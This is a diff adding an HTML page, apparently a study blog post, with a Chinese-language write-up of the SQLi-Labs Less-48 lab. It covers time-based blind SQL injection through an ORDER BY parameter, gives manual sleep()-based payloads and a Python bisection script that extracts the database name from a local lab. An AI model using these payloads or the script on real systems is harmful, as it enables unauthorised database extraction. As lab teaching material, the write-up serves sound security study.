@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-48 ORDER BY 时间盲注 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-48 ORDER BY 时间盲注 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, ORDER BY注入, 时间盲注, Python自动化</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-48 (GET - Blind Based - Numeric - ORDER BY)</li>
+        <li><strong>提示：</strong>注入点为 <code>sort</code> 参数，纯数字型（页面提示有误，实际源码为 <code>ORDER BY $id</code>），无报错、无回显。</li>
+    </ul>
+
+    <h2>2. 核心原理：ORDER BY 时间盲注</h2>
+    <p>本关卡屏蔽了报错，且页面只渲染正常的用户列表，无查询结果回显，属于盲注环境。</p>
+    <p>由于是纯数字型注入，可直接将 <code>if()</code> 函数和 <code>sleep()</code> 作为排序表达式执行。但必须注意：<code>ORDER BY</code> 会对结果集的每一行进行求值。若直接写 <code>sleep(5)</code>，页面会卡顿数十秒。必须使用 <code>if(id=1, sleep(5), 0)</code>，限定仅在特定行触发延时。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：手工验证延时</strong></p>
+    <p><strong>输入 URL：</strong><code>?sort=if(id=1,sleep(5),0)</code></p>
+    <p><strong>回显现象：</strong>页面加载明显卡顿约 5 秒，随后正常渲染出打乱顺序的用户表格。证明延时通道存在。</p>
+
+    <p><strong>第二步：验证 ASCII 条件判断</strong></p>
+    <p><strong>输入 URL：</strong><code>?sort=if(ascii(substr(database(),1,1))>100,sleep(5),0)</code></p>
+    <p><strong>回显现象：</strong>页面再次卡顿 5 秒，证明库名首字母 ASCII 码大于 100。</p>
+
+    <p><strong>第三步：使用 Python 脚本进行二分法自动化</strong></p>
+    <p>在 VS Code 中编写并运行脚本，利用 HTTP 请求的耗时差推断字符的 ASCII 码。</p>
+    <pre><code>import requests
+import time
+
+url = "http://localhost/sqli-labs-master/Less-48/"
+delay_threshold = 2.5 # 延时阈值，大于2.5秒说明 sleep(3) 执行了
+
+def get_ascii(payload):
+    low = 32
+    high = 126
+    while low &lt;= high:
+        mid = (low + high) // 2
+        
+        # 构造时间盲注 Payload，用 id=1 包裹限制单行触发
+        inject = f"if(id=1,if(ascii(substr(({payload}),{pos},1))&gt;{mid},sleep(3),0),0)"
+        full_url = f"{url}?sort={inject}"
+        
+        start_time = time.time()
+        response = requests.get(full_url)
+        end_time = time.time()
+        
+        # 核心判断：看响应时间是否超时
+        if (end_time - start_time) &gt; delay_threshold:
+            low = mid + 1
+        else:
+            high = mid - 1
+            
+    return low
+
+def extract(sql):
+    global pos
+    result = ""
+    for i in range(1, 50):
+        pos = i
+        ascii_code = get_ascii(sql)
+        if ascii_code == 0 or ascii_code &gt; 126:
+            break
+        char = chr(ascii_code)
+        result += char
+        print(f"[+] 发现第 {i} 个字符: {char}，当前结果: {result}")
+    return result
+
+if __name__ == "__main__":
+    print("[*] 开始时间盲注爆破...")
+    db_name = extract("select database()")
+    print(f"[*] 爆破完成，数据库名为: {db_name}")</code></pre>
+    
+    <p><strong>代码成分解析：</strong></p>
+    <ul>
+        <li><code>if(id=1, if(...), 0)</code>：利用 <code>id=1</code> 限制排序执行次数，防止全表卡顿。</li>
+        <li><code>time.time()</code>：记录请求前后时间，利用差值判断是否发生了 <code>sleep(3)</code> 延时。</li>
+        <li><strong>二分法（Bisection）</strong>：通过询问 <code>ascii &gt; mid</code>，不断折半缩小范围，快速锁定字符的 ASCII 码。</li>
+    </ul>
+
+    <p><strong>运行结果：</strong>终端成功输出 <code>security</code>，但在结尾输出了额外的空格。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>盲注循环终止条件：</strong>脚本运行最后打印了多个空格（ASCII 32），是因为当 <code>substr</code> 截取不到字符时，比较结果恒为 False，脚本一路折半至下限 32。在实战中，应将中断条件改为 <code>if ascii_code &lt;= 32: break</code>，防止无效字符循环。</li>
+        <li><strong>全表卡顿问题：</strong><code>ORDER BY</code> 会对每一行执行表达式，必须配合 <code>if(id=1, ...)</code> 使用，否则测试耗时将成倍增加。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>时间盲注（Time-based Blind SQLi）</strong>：在无回显、无报错的环境下，利用 <code>sleep()</code> 函数产生的时间差建立布尔通道。</li>
+        <li><strong>ORDER BY 注入的特殊性</strong>：需考虑 SQL 执行时对全表求值的特性，合理控制延时的触发范围。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
